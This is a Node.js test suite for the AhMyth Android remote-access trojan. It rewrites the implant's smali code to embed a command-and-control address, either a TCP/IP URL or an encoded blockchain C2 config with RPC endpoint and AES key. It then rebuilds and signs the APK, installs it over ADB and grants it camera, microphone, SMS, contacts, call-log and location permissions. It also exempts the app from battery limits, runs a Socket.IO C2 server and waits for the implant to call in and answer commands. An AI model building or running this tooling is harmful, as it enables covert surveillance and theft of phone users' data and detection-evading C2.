#!/usr/bin/env node
/**
 * Connection Test Suite - Tests both TCP/IP and Blockchain C2 connections
 * Always builds, installs, and runs fresh APK for each test
 */

const { Server } = require('socket.io');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');

const execAsync = promisify(exec);

// Configuration
const PORT = parseInt(process.env.PORT) || 1234;
const TCP_IP = process.env.TCP_IP || '192.168.0.177';
const TEST_TIMEOUT = 60000; // 60 seconds timeout per test
const CONNECTION_TIMEOUT = 90000; // 90 seconds to wait for connection
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';
const FACTORY_PATH = path.join(__dirname, 'AhMyth-Server', 'app', 'Factory');
const APK_FOLDER = path.join(FACTORY_PATH, 'Ahmyth');
const APKTOOL_JAR = path.join(FACTORY_PATH, 'apktool.jar');
const SIGN_JAR = path.join(FACTORY_PATH, 'sign.jar');

// Blockchain C2 Configuration
const BLOCKCHAIN_RPC_URL = process.env.BLOCKCHAIN_RPC_URL || 'https://sepolia.infura.io/v3/eb6193cd13ca486abc3385b74bfe7a68';
const BLOCKCHAIN_CONTRACT = process.env.BLOCKCHAIN_CONTRACT_ADDRESS
    || process.env.BLOCKCHAIN_CONTRACT
    || '0x0000000000000000000000000000000000000000';
const BLOCKCHAIN_BLOCK_STEP = parseInt(process.env.BLOCKCHAIN_BLOCK_STEP) || 10;
const BLOCKCHAIN_CANDIDATES = parseInt(process.env.BLOCKCHAIN_CANDIDATES) || 5;
const BLOCKCHAIN_AES_KEY = process.env.BLOCKCHAIN_C2_AES_KEY || '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
const BLOCKCHAIN_CLIENT_PRIVATE_KEY = process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || '';

// Colors for output
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
    blue: "\x1b[34m",
    gray: "\x1b[90m"
};

let testResults = [];
let clientSocket = null;
let deviceInfo = null;
let server = null;
let io = null;
let currentDeviceId = null;

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    switch(type) {
        case 'success': color = colors.green; break;
        case 'error': color = colors.red; break;
        case 'warn': color = colors.yellow; break;
        case 'header': color = colors.cyan; break;
        case 'debug': color = colors.blue; break;
        case 'info': color = colors.gray; break;
    }
    console.log(`${color}[${timestamp}] ${msg}${colors.reset}`);
}

// Utility: Restart ADB server
async function restartAdbServer() {
    try {
        log('Restarting ADB server...', 'info');
        await execAsync('adb kill-server').catch(() => {});
        await new Promise(resolve => setTimeout(resolve, 1000));
        await execAsync('adb start-server');
        await new Promise(resolve => setTimeout(resolve, 2000));
        log('ADB server restarted', 'success');
    } catch (e) {
        log(`ADB restart warning: ${e.message}`, 'warn');
    }
}

// Utility: Check ADB device
async function checkAdbDevice() {
    try {
        const { stdout } = await execAsync('adb devices');
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        const devices = lines.filter(line => line.includes('device') && !line.includes('offline'));
        
        if (devices.length === 0) {
            log('No ADB devices found, restarting ADB server...', 'warn');
            await restartAdbServer();
            
            // Check again
            const { stdout: stdout2 } = await execAsync('adb devices');
            const lines2 = stdout2.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
            const devices2 = lines2.filter(line => line.includes('device') && !line.includes('offline'));
            
            if (devices2.length === 0) {
                log('No ADB devices found after restart', 'error');
                return null;
            }
            
            const deviceId = devices2[0].split('\t')[0].trim();
            log(`Found device after restart: ${deviceId}`, 'success');
            return deviceId;
        }
        
        const deviceId = devices[0].split('\t')[0].trim();
        log(`Found device: ${deviceId}`, 'success');
        return deviceId;
    } catch (e) {
        log(`ADB check failed: ${e.message}`, 'error');
        return null;
    }
}

// Utility: Find IOSocket file
function findIOSocketFile() {
    const paths = [
        path.join(APK_FOLDER, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
        path.join(APK_FOLDER, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
        path.join(APK_FOLDER, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
    ];
    
    for (const p of paths) {
        if (fs.existsSync(p)) {
            return p;
        }
    }
    return null;
}

function replaceConnectionLiteral(content, newValue, order = ['http', 'blockchain']) {
    const patterns = {
        http: /(\s*const-string\s+)(v\d+)(,\s*)"http:\/\/[^"]+:\d+"/,
        blockchain: /(\s*const-string\s+)(v\d+)(,\s*)"BLOCKCHAIN_C2_CONFIG:[^"]+"/
    };
    
    for (const source of order) {
        const regex = patterns[source];
        if (!regex) {
            continue;
        }
        
        const match = content.match(regex);
        if (match) {
            const [, prefix, register, separator] = match;
            const replacement = `${prefix}${register}${separator}"${newValue}"`;
            const updated = content.replace(regex, replacement);
            return { content: updated, register, source };
        }
    }
    
    return null;
}

// Utility: Build APK with TCP/IP configuration
async function buildTcpApk() {
    log('Building APK with TCP/IP configuration...', 'header');
    
    const iosocketFile = findIOSocketFile();
    if (!iosocketFile) {
        throw new Error('IOSocket.smali not found');
    }
    
    let content = fs.readFileSync(iosocketFile, 'utf8');
    const tcpUrl = `http://${TCP_IP}:${PORT}`;
    let replaced = false;
    
    const literalReplacement = replaceConnectionLiteral(content, tcpUrl, ['blockchain', 'http']);
    if (literalReplacement) {
        content = literalReplacement.content;
        replaced = true;
        log(`Replaced ${literalReplacement.register || 'connection'} literal with TCP/IP URL`, 'debug');
    }
    
    // Strategy 1: Replace existing blockchain config
    if (!replaced) {
        const blockchainPattern = /BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=\s\n]+/;
        if (blockchainPattern.test(content)) {
            content = content.replace(blockchainPattern, tcpUrl);
            replaced = true;
            log('Replaced existing blockchain config with TCP/IP', 'debug');
        }
    }
    
    // Strategy 2: Replace existing http:// URL
    if (!replaced) {
        const urlPattern = /http:\/\/[^"`\s\n]+:\d+/;
        if (urlPattern.test(content)) {
            content = content.replace(urlPattern, tcpUrl);
            replaced = true;
            log('Replaced existing URL with TCP/IP', 'debug');
        }
    }
    
    // Strategy 3: Replace in const-string
    if (!replaced) {
        const constStringPattern = /const-string\s+v\d+,\s*"BLOCKCHAIN_C2_CONFIG:[^"]+"/;
        if (constStringPattern.test(content)) {
            content = content.replace(constStringPattern, (match) => {
                return match.replace(/BLOCKCHAIN_C2_CONFIG:[^"]+/, tcpUrl);
            });
            replaced = true;
            log('Replaced blockchain config in const-string', 'debug');
        }
    }
    
    // Strategy 4: Replace http:// in const-string
    if (!replaced) {
        const constStringPattern = /const-string\s+v\d+,\s*"http:\/\/[^"]+:\d+"/;
        if (constStringPattern.test(content)) {
            content = content.replace(constStringPattern, (match) => {
                return match.replace(/http:\/\/[^"]+:\d+/, tcpUrl);
            });
            replaced = true;
            log('Replaced URL in const-string', 'debug');
        }
    }
    
    // Strategy 5: Find const-string with BLOCKCHAIN and replace the whole value
    if (!replaced) {
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
            if (lines[i].includes('const-string') && lines[i].includes('BLOCKCHAIN_C2_CONFIG')) {
                // Replace the entire value between quotes
                lines[i] = lines[i].replace(/"BLOCKCHAIN_C2_CONFIG:[^"]+"/, `"${tcpUrl}"`);
                content = lines.join('\n');
                replaced = true;
                log('Replaced blockchain config in line', 'debug');
                break;
            }
        }
    }
    
    if (!replaced) {
        // Show sample for debugging
        const sample = content.substring(0, Math.min(1000, content.length));
        log('Could not find pattern. Sample content:', 'error');
        log(sample, 'error');
        throw new Error('Could not find URL pattern to replace');
    }
    
    fs.writeFileSync(iosocketFile, content, 'utf8');
    log('TCP/IP configuration injected', 'success');
    
    return await compileAndSignApk('tcp');
}

// Utility: Build APK with Blockchain C2 configuration
async function buildBlockchainApk() {
    log('Building APK with Blockchain C2 configuration...', 'header');
    
    const iosocketFile = findIOSocketFile();
    if (!iosocketFile) {
        throw new Error('IOSocket.smali not found');
    }
    
    let content = fs.readFileSync(iosocketFile, 'utf8');
    
    // Create blockchain C2 configuration JSON
    const config = {
        type: 'blockchain',
        rpcUrl: BLOCKCHAIN_RPC_URL,
        contractAddress: BLOCKCHAIN_CONTRACT,
        blockStep: BLOCKCHAIN_BLOCK_STEP,
        candidatesPerCycle: BLOCKCHAIN_CANDIDATES,
        aesKey: BLOCKCHAIN_AES_KEY
    };
    
    if (BLOCKCHAIN_CLIENT_PRIVATE_KEY) {
        config.clientPrivateKey = BLOCKCHAIN_CLIENT_PRIVATE_KEY;
    }
    
    const configJson = JSON.stringify(config);
    
    // Encode to base64
    const base64Config = Buffer.from(configJson).toString('base64');
    const blockchainMarker = `BLOCKCHAIN_C2_CONFIG:${base64Config}`;
    
    let replaced = false;
    
    const literalReplacement = replaceConnectionLiteral(content, blockchainMarker, ['http', 'blockchain']);
    if (literalReplacement) {
        content = literalReplacement.content;
        replaced = true;
        log(`Replaced ${literalReplacement.register || 'connection'} literal with blockchain config`, 'debug');
    }
    
    // Strategy 1: Replace existing blockchain config
    if (!replaced) {
        const existingBlockchainPattern = /BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=\s\n]+/;
        if (existingBlockchainPattern.test(content)) {
            content = content.replace(existingBlockchainPattern, blockchainMarker);
            replaced = true;
            log('Replaced existing blockchain config', 'debug');
        }
    }
    
    // Strategy 2: Replace existing http:// URL
    if (!replaced) {
        const urlPattern = /http:\/\/[^"`\s\n]+:\d+/;
        if (urlPattern.test(content)) {
            content = content.replace(urlPattern, blockchainMarker);
            replaced = true;
            log('Replaced existing URL with blockchain config', 'debug');
        }
    }
    
    // Strategy 3: Replace in const-string with blockchain
    if (!replaced) {
        const constStringPattern = /const-string\s+v\d+,\s*"BLOCKCHAIN_C2_CONFIG:[^"]+"/;
        if (constStringPattern.test(content)) {
            content = content.replace(constStringPattern, (match) => {
                return match.replace(/BLOCKCHAIN_C2_CONFIG:[^"]+/, blockchainMarker);
            });
            replaced = true;
            log('Replaced blockchain config in const-string', 'debug');
        }
    }
    
    // Strategy 4: Replace http:// in const-string
    if (!replaced) {
        const constStringPattern = /const-string\s+v\d+,\s*"http:\/\/[^"]+:\d+"/;
        if (constStringPattern.test(content)) {
            content = content.replace(constStringPattern, (match) => {
                return match.replace(/http:\/\/[^"]+:\d+/, blockchainMarker);
            });
            replaced = true;
            log('Replaced URL in const-string', 'debug');
        }
    }
    
    // Strategy 5: Find const-string line and replace
    if (!replaced) {
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
            if (lines[i].includes('const-string')) {
                // Check if it has http:// or BLOCKCHAIN
                if (lines[i].includes('http://') || lines[i].includes('BLOCKCHAIN_C2_CONFIG')) {
                    // Replace the value between quotes
                    lines[i] = lines[i].replace(/"http:\/\/[^"]+:\d+"/, `"${blockchainMarker}"`);
                    lines[i] = lines[i].replace(/"BLOCKCHAIN_C2_CONFIG:[^"]+"/, `"${blockchainMarker}"`);
                    content = lines.join('\n');
                    replaced = true;
                    log('Replaced in const-string line', 'debug');
                    break;
                }
            }
        }
    }
    
    if (!replaced) {
        // Show sample for debugging
        const sample = content.substring(0, Math.min(1000, content.length));
        log('Could not find pattern. Sample content:', 'error');
        log(sample, 'error');
        throw new Error('Could not find URL pattern to replace with blockchain config');
    }
    
    fs.writeFileSync(iosocketFile, content, 'utf8');
    log('Blockchain C2 configuration injected', 'success');
    
    return await compileAndSignApk('blockchain');
}

// Utility: Compile and sign APK
async function compileAndSignApk(type) {
    log('Compiling APK...', 'info');
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0] + '-' + Date.now();
    const outputApk = path.join(FACTORY_PATH, `Ahmyth-${type}-${timestamp}.apk`);
    
    const buildCmd = `java -jar "${APKTOOL_JAR}" b "${APK_FOLDER}" -o "${outputApk}"`;
    await execAsync(buildCmd, { cwd: FACTORY_PATH, maxBuffer: 10 * 1024 * 1024 });
    
    if (!fs.existsSync(outputApk)) {
        throw new Error('APK build failed - output file not found');
    }
    
    log('APK compiled successfully', 'success');
    
    // Sign APK
    log('Signing APK...', 'info');
    const signCmd = `java -jar "${SIGN_JAR}" -a "${outputApk}"`;
    await execAsync(signCmd, { cwd: FACTORY_PATH, maxBuffer: 10 * 1024 * 1024 });
    
    // Find signed APK
    const signedApk = outputApk.replace('.apk', '-aligned-debugSigned.apk');
    if (fs.existsSync(signedApk)) {
        log('APK signed successfully', 'success');
        return signedApk;
    }
    
    // Try alternative name
    const altSigned = path.join(FACTORY_PATH, `Ahmyth-${type}-${timestamp}-aligned-debugSigned.apk`);
    if (fs.existsSync(altSigned)) {
        log('APK signed successfully', 'success');
        return altSigned;
    }
    
    throw new Error('APK signing failed - signed file not found');
}

// Utility: Install APK
async function installApk(apkPath, deviceId) {
    log(`Installing APK on device ${deviceId}...`, 'info');
    
    // Uninstall old version
    try {
        await execAsync(`adb -s ${deviceId} uninstall ${PACKAGE_NAME}`, { timeout: 10000 });
        log('Old version uninstalled', 'info');
        await new Promise(resolve => setTimeout(resolve, 2000));
    } catch (e) {
        // Ignore if not installed
    }
    
    // Install new APK
    const { stdout, stderr } = await execAsync(`adb -s ${deviceId} install -r "${apkPath}"`, { timeout: 60000 });
    
    if (stdout.includes('Success') || stdout.includes('success') || !stderr.includes('Error')) {
        log('APK installed successfully', 'success');
        return true;
    } else {
        throw new Error(`Installation failed: ${stdout} ${stderr}`);
    }
}

// Utility: Grant permissions
async function grantPermissions(deviceId) {
    log('Granting permissions...', 'info');
    const permissions = [
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.SEND_SMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.GET_ACCOUNTS',
        'android.permission.ACCESS_WIFI_STATE',
        'android.permission.CHANGE_WIFI_STATE',
        'android.permission.ACCESS_BACKGROUND_LOCATION',
        'android.permission.POST_NOTIFICATIONS'
    ];
    
    let granted = 0;
    for (const perm of permissions) {
        try {
            await execAsync(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} ${perm}`);
            granted++;
        } catch (e) {
            // Some permissions may fail
        }
    }
    
    // Special permissions
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow`);
    } catch (e) {}
    
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_IN_BACKGROUND allow`);
    } catch (e) {}
    
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_ANY_IN_BACKGROUND allow`);
    } catch (e) {}
    
    try {
        await execAsync(`adb -s ${deviceId} shell dumpsys deviceidle whitelist +${PACKAGE_NAME}`);
    } catch (e) {}
    
    log(`Permissions granted: ${granted} runtime + special permissions`, 'success');
}

// Utility: Start app
async function startApp(deviceId) {
    log('Starting app...', 'info');
    
    // Start MainService
    try {
        await execAsync(`adb -s ${deviceId} shell am startservice ${PACKAGE_NAME}/${PACKAGE_NAME}.MainService`, { timeout: 5000 });
        log('MainService started', 'info');
        await new Promise(resolve => setTimeout(resolve, 2000));
    } catch (e) {
        log(`Service start: ${e.message}`, 'info');
    }
    
    // Start MainActivity
    try {
        await execAsync(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`, { timeout: 10000 });
        log('MainActivity started', 'info');
        await new Promise(resolve => setTimeout(resolve, 3000));
    } catch (e) {
        log(`Activity start: ${e.message}`, 'info');
    }
    
    // Bring to foreground again
    try {
        await execAsync(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    } catch (e) {}
    
    // Verify app is running
    try {
        const { stdout } = await execAsync(`adb -s ${deviceId} shell pidof ${PACKAGE_NAME}`);
        if (stdout.trim()) {
            log(`App is running (PID: ${stdout.trim()})`, 'success');
        }
    } catch (e) {
        log('Could not verify app PID', 'warn');
    }
}

// Start Socket.IO server
async function startServer(port = PORT) {
    return new Promise((resolve, reject) => {
        if (server) {
            server.close();
        }
        
        const httpServer = http.createServer();
        server = httpServer;
        clientSocket = null;
        
        io = new Server(httpServer, {
            cors: {
                origin: "*",
                methods: ["GET", "POST"]
            },
            pingInterval: 25000,
            pingTimeout: 20000,
            connectTimeout: 45000,
            allowEIO3: true
        });
        
        httpServer.listen(port, '0.0.0.0', () => {
            log(`Server started on port ${port}`, 'success');
            resolve();
        });
        
        io.on('connection', (socket) => {
            log('Client connected!', 'success');
            clientSocket = socket;
            
            const query = socket.handshake.query;
            deviceInfo = {
                id: query.id,
                model: query.model,
                manufacturer: query.manf,
                release: query.release,
                sdk: query.sdk
            };
            
            log(`Device: ${deviceInfo.model} (${deviceInfo.manufacturer})`, 'info');
            log(`Android: ${deviceInfo.release} (SDK ${deviceInfo.sdk})`, 'info');
            
            socket.on('disconnect', () => {
                log('Client disconnected', 'warn');
                clientSocket = null;
            });
        });
    });
}

// Wait for connection
async function waitForConnection(timeout = CONNECTION_TIMEOUT, deviceId) {
    log(`Waiting for client connection (up to ${timeout/1000} seconds)...`, 'info');
    
    const startTime = Date.now();
    while (Date.now() - startTime < timeout) {
        if (clientSocket) {
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            log(`Client connected after ${elapsed} seconds!`, 'success');
            return true;
        }
        
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        if (elapsed % 10 === 0 && elapsed > 0) {
            log(`Still waiting... (${elapsed}/${timeout/1000} seconds)`, 'info');
            
            // Check logs
            try {
                const { stdout } = await execAsync(`adb -s ${deviceId} logcat -d | grep -i "ahmyth\|blockchain\|iosocket\|error\|exception" | tail -5`);
                if (stdout) {
                    const lines = stdout.split('\n').filter(l => l.trim());
                    if (lines.length > 0) {
                        log('Recent logs:', 'debug');
                        lines.forEach(line => {
                            if (line.toLowerCase().includes('error') || line.toLowerCase().includes('exception')) {
                                log(`  ${line}`, 'error');
                            } else {
                                log(`  ${line}`, 'debug');
                            }
                        });
                    }
                }
            } catch (e) {}
            
            // Try to bring app to foreground
            try {
                await execAsync(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
            } catch (e) {}
        }
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    // Final log check
    log('Connection timeout. Checking final logs...', 'warn');
    try {
        const { stdout } = await execAsync(`adb -s ${deviceId} logcat -d | grep -i "ahmyth\|blockchain\|iosocket" | tail -20`);
        if (stdout) {
            log('Final logs:', 'error');
            stdout.split('\n').filter(l => l.trim()).forEach(line => {
                log(`  ${line}`, 'error');
            });
        }
    } catch (e) {}
    
    return false;
}

async function verifyBlockchainMode(deviceId, timeout = CONNECTION_TIMEOUT) {
    const detectionPatterns = [
        /BLOCKCHAIN C2 MODE DETECTED/i,
        /Blockchain C2 mode detected/i,
        /Socket\.IO connection will NOT be initialized/i
    ];
    
    const socketPatterns = [
        /xhr poll error/i,
        /EngineIOException/i,
        /Using TCP\/IP Socket\.IO mode/i,
        /Connecting to: http/i
    ];
    
    const startTime = Date.now();
    while (Date.now() - startTime < timeout) {
        try {
            const { stdout } = await execAsync(`adb -s ${deviceId} logcat -d -t 300`, { maxBuffer: 1024 * 1024 * 5 });
            const lines = stdout.split('\n').filter(line => line.trim());
            const blockchainDetected = lines.some(line => detectionPatterns.some(pattern => pattern.test(line)));
            const socketErrors = lines.some(line => socketPatterns.some(pattern => pattern.test(line)));
            
            if (blockchainDetected) {
                return { blockchainDetected: true, socketErrors, lines };
            }
        } catch (error) {
            log(`Blockchain verification warning: ${error.message}`, 'warn');
        }
        
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
    
    return { blockchainDetected: false, socketErrors: false, lines: [] };
}

// Test TCP/IP connection
async function testTcpConnection() {
    log('\n' + '='.repeat(60), 'header');
    log('TEST 1: TCP/IP Connection', 'header');
    log('='.repeat(60), 'header');
    
    const startTime = Date.now();
    let result = { name: 'TCP/IP Connection', success: false, error: null, duration: 0 };
    
    try {
        // Step 1: Check device
        currentDeviceId = await checkAdbDevice();
        if (!currentDeviceId) {
            throw new Error('No ADB device available');
        }
        
        // Step 2: Build TCP/IP APK
        const apkPath = await buildTcpApk();
        
        // Step 3: Install
        await installApk(apkPath, currentDeviceId);
        
        // Step 4: Grant permissions
        await grantPermissions(currentDeviceId);
        
        // Step 5: Start server
        await startServer();
        
        // Step 6: Start app
        await startApp(currentDeviceId);
        
        // Step 7: Wait for connection
        const connected = await waitForConnection(CONNECTION_TIMEOUT, currentDeviceId);
        
        if (connected) {
            result.success = true;
            result.message = 'TCP/IP connection established';
            result.duration = Date.now() - startTime;
            log(`✓ TCP/IP Connection: ${result.message} (${result.duration}ms)`, 'success');
        } else {
            throw new Error('Client did not connect within timeout');
        }
        
    } catch (error) {
        result.success = false;
        result.error = error.message;
        result.duration = Date.now() - startTime;
        log(`✗ TCP/IP Connection: ${result.error} (${result.duration}ms)`, 'error');
    }
    
    // Cleanup
    if (server) {
        server.close();
        server = null;
    }
    clientSocket = null;
    
    testResults.push(result);
    return result;
}

// Test Blockchain C2 connection
async function testBlockchainConnection() {
    log('\n' + '='.repeat(60), 'header');
    log('TEST 2: Blockchain C2 Connection', 'header');
    log('='.repeat(60), 'header');
    log(`RPC URL: ${BLOCKCHAIN_RPC_URL}`, 'info');
    log(`Block Step: ${BLOCKCHAIN_BLOCK_STEP}`, 'info');
    log(`Candidates: ${BLOCKCHAIN_CANDIDATES}`, 'info');
    log('='.repeat(60), 'header');
    
    const startTime = Date.now();
    let result = { name: 'Blockchain C2 Connection', success: false, error: null, duration: 0 };
    
    try {
        // Step 1: Check device
        currentDeviceId = await checkAdbDevice();
        if (!currentDeviceId) {
            throw new Error('No ADB device available');
        }
        
        // Step 2: Build Blockchain C2 APK
        const apkPath = await buildBlockchainApk();
        
        // Step 3: Install
        await installApk(apkPath, currentDeviceId);
        
        // Step 4: Grant permissions
        await grantPermissions(currentDeviceId);
        
        // Step 5: Clear existing logs to ensure fresh blockchain signals
        try {
            await execAsync(`adb -s ${currentDeviceId} logcat -c`);
        } catch (e) {
            log(`Failed to clear logcat: ${e.message}`, 'warn');
        }
        
        // Step 6: Start app (blockchain mode should prevent socket usage)
        await startApp(currentDeviceId);
        
        // Step 7: Verify blockchain-only mode via device logs
        const verification = await verifyBlockchainMode(currentDeviceId, CONNECTION_TIMEOUT);
        const recentLogs = verification.lines.slice(-10);
        if (recentLogs.length > 0) {
            log('Recent blockchain logs:', 'info');
            recentLogs.forEach(line => {
                const formatted = line.trim();
                if (/error|failed|exception/i.test(formatted)) {
                    log(`  ${formatted}`, 'error');
                } else {
                    log(`  ${formatted}`, 'debug');
                }
            });
        }
        
        if (!verification.blockchainDetected) {
            throw new Error('Blockchain mode not detected in logcat output');
        }
        
        if (verification.socketErrors) {
            throw new Error('Blockchain mode detected but Socket.IO errors are still present');
        }
        
        result.success = true;
        result.message = 'Blockchain C2 mode detected (Socket.IO disabled)';
        result.duration = Date.now() - startTime;
        log(`✓ Blockchain C2 Connection: ${result.message} (${result.duration}ms)`, 'success');
        
    } catch (error) {
        result.success = false;
        result.error = error.message;
        result.duration = Date.now() - startTime;
        log(`✗ Blockchain C2 Connection: ${result.error} (${result.duration}ms)`, 'error');
    }
    
    // Cleanup
    if (server) {
        server.close();
        server = null;
    }
    clientSocket = null;
    
    testResults.push(result);
    return result;
}

// Test functions over blockchain
async function testBlockchainFunctions() {
    log('\n' + '='.repeat(60), 'header');
    log('TEST 3: Functions over Blockchain C2', 'header');
    log('='.repeat(60), 'header');
    
    const startTime = Date.now();
    let result = { name: 'Blockchain C2 Functions', success: false, error: null, duration: 0 };
    
    if (!clientSocket) {
        result.error = 'No client connected';
        log(`✗ ${result.name}: ${result.error}`, 'error');
        testResults.push(result);
        return result;
    }
    
    try {
        // Test basic command
        log('Testing basic command...', 'info');
        const testCommand = new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Command timeout'));
            }, 30000);
            
            clientSocket.emit('0x0000si', {}, (response) => {
                clearTimeout(timeout);
                if (response && response !== 'null') {
                    resolve(response);
                } else {
                    reject(new Error('Invalid response'));
                }
            });
        });
        
        const response = await testCommand;
        result.success = true;
        result.message = 'Function test passed';
        result.duration = Date.now() - startTime;
        log(`✓ ${result.name}: ${result.message} (${result.duration}ms)`, 'success');
        
    } catch (error) {
        result.success = false;
        result.error = error.message;
        result.duration = Date.now() - startTime;
        log(`✗ ${result.name}: ${result.error} (${result.duration}ms)`, 'error');
    }
    
    testResults.push(result);
    return result;
}

// Main test suite
async function runTestSuite() {
    log('\n' + '='.repeat(60), 'header');
    log('Connection Test Suite', 'header');
    log('='.repeat(60), 'header');
    log(`TCP IP: ${TCP_IP}:${PORT}`, 'info');
    log(`Blockchain RPC: ${BLOCKCHAIN_RPC_URL}`, 'info');
    log('='.repeat(60) + '\n', 'header');
    
    try {
        // Test 1: TCP/IP Connection
        const tcpResult = await testTcpConnection();
        
        if (!tcpResult.success) {
            log('\nTCP/IP connection failed. Fixing and retrying...', 'warn');
            // Wait a bit before retry
            await new Promise(resolve => setTimeout(resolve, 5000));
            const retryResult = await testTcpConnection();
            if (!retryResult.success) {
                log('TCP/IP connection failed after retry', 'error');
            }
        }
        
        // Test 2: Blockchain C2 Connection
        const blockchainResult = await testBlockchainConnection();
        
        if (!blockchainResult.success) {
            log('\nBlockchain C2 connection failed. Fixing and retrying...', 'warn');
            await new Promise(resolve => setTimeout(resolve, 5000));
            const retryResult = await testBlockchainConnection();
            if (!retryResult.success) {
                log('Blockchain C2 connection failed after retry', 'error');
            }
        }
        
        // Test 3: Functions over Blockchain (only if blockchain connected)
        if (blockchainResult.success && clientSocket) {
            await testBlockchainFunctions();
        }
        
        // Summary
        log('\n' + '='.repeat(60), 'header');
        log('Test Summary', 'header');
        log('='.repeat(60), 'header');
        
        const passed = testResults.filter(r => r.success).length;
        const failed = testResults.filter(r => !r.success).length;
        
        testResults.forEach(result => {
            const status = result.success ? '✓' : '✗';
            const color = result.success ? 'success' : 'error';
            log(`${status} ${result.name} (${(result.duration/1000).toFixed(1)}s)`, color);
            if (result.error) {
                log(`  Error: ${result.error}`, 'error');
            }
        });
        
        log('='.repeat(60), 'header');
        log(`Total: ${testResults.length} | Passed: ${passed} | Failed: ${failed}`, 
            failed > 0 ? 'error' : 'success');
        log('='.repeat(60) + '\n', 'header');
        
        if (failed > 0) {
            process.exit(1);
        }
        
    } catch (error) {
        log(`Fatal error: ${error.message}`, 'error');
        process.exit(1);
    } finally {
        if (server) {
            server.close();
        }
    }
}

// Run if called directly
if (require.main === module) {
    runTestSuite().catch(error => {
        log(`Fatal error: ${error.message}`, 'error');
        process.exit(1);
    });
}

module.exports = { runTestSuite, testTcpConnection, testBlockchainConnection };
